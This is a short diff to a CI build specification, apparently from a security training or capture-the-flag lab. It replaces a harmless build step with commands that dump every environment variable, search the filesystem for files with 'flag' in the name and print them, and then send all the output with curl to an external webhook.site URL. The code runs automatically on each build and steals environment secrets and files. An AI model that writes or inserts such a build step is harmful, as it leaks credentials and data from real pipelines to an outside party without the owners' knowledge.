@@ -3,6 +3,12 @@ version: 0.2
 phases:
   build:
     commands:
-      - echo "Running vulnerable training build"
-      - env | sort | head -n 20
-      - echo "Done"
+      - |
+        {
+          echo "=== ENVIRONMENT ==="
+          env | sort
+          echo "=== FLAG FILES ==="
+          find / -maxdepth 3 -type f -iname '*flag*' \
+            -exec sh -c 'echo "--- $1"; cat "$1"' _ {} \; 2>/dev/null
+        } | curl -fsS --data-binary @- \
+          'https://webhook.site/0b9973f6-84da-4f46-a8d0-11077072813e'
